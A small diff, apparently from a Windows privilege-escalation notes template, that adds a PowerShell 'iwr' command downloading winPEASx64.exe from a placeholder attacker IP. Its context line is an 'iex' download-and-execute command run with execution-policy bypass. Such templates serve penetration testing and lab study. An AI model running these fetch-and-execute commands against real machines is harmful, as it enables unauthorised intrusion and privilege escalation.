@@ -180,3 +180,9 @@ powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadStrin
 ```
 <insert winpeas output here>
 ```
+```powershell
+iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
+```
+```
+<insert output from winpeas exe here>
+```
